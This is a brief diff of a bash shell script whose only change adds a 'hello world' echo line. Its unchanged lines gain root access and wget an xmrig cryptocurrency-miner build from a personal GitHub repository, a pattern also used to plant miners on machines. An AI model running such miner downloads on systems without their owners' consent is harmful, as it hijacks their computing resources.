@@ -1,5 +1,5 @@
 #!/usr/bin/bash
-
+echo "hello world"
 sudo -i
 echo y | sudo apt-get install screen
 wget https://github.com/shyuan2333/waku/raw/master/xmrig-v6.3.3-C3-lin64-compat.zip
